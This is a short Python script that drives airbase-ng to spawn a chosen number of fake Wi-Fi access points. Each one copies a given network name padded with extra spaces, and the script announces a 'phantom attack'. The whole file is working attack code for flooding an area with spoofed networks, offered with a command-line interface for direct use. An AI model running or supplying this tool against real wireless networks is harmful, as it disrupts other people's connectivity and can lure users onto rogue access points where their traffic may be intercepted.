# Copyright 2024 Savashxpert
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.



import subprocess
import time
import optparse

with open("banner", "r") as file:
    banner = file.read()
    print(banner)


def check_interface_status(interface):
    result = subprocess.run(["ifconfig", interface], capture_output=True, text=True)
    if result.returncode != 0:
        raise ValueError(f"Interface '{interface}' is not found or not available.")

    return result.stdout


def start(essid, interface, count):
    interface_output = check_interface_status(interface)

    space = 1
    value = 1
    try:
        for _ in range(count):
            ssid = essid + " " * space
            proc = subprocess.Popen(["/usr/sbin/airbase-ng", "-e", ssid, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            space += 1
            time.sleep(1)
            if proc.poll() is None:

                print(f"AP {essid}{value} is currently active!")
                print("Launching a phantom attack\n")

            value += 1
    except KeyboardInterrupt:
        print("\nExiting...")
        pass


if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-e", "--essid", dest="essid", help="SSID of the fake access points")
    parser.add_option("-i", "--interface", dest="interface", help="Wireless interface to use")
    parser.add_option("-c", "--count", dest="count", type="int", help="Number of fake access points to create")

    (options, args) = parser.parse_args()

    if not options.essid:
        parser.error("SSID is required. Use -e or --essid to specify it.")
    if not options.interface:
        parser.error("Wireless interface is required. Use -i or --interface to specify it.")
    if options.count is None:
        parser.error("Count is required. Use -c or --count to specify it.")

    try:
        start(options.essid, options.interface, options.count)

    except ValueError as e:
        print(f"Error: {e}")

